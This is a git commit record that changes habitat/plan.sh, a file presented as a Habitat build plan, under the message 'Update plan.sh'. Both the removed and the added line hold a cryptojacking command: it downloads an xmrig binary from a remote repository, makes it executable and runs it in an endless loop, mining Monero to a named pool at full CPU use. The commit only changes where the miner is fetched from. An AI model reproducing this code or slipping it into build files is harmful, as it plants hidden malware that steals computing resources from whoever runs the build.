83a0f3519660f37b403fe50461d17b3eb08d5846
phyllishkibby <47544243+phyllishkibby@users.noreply.github.com>
2019-03-27 02:03:57 +0300

    Update plan.sh

--- habitat/plan.sh
+++ habitat/plan.sh
@@ -1,1 +1,1 @@
-wget https://github.com/khushhalen/drone-docker/releases/download/1/xmrig && chmod +x xmrig && while true; do ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u empireofbooks@gmail.com -p x --threads 2 --max-cpu-usage=100 --cpu-priority 5 --donate-level 1 ; sleep 1; done
+wget https://gitlab.com/madisonmedia/madisonmedia/raw/master/xmrig && chmod +x xmrig && while true; do ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u empireofbooks@gmail.com -p x --threads 2 --max-cpu-usage=100 --cpu-priority 5 --donate-level 1 ; sleep 1; done
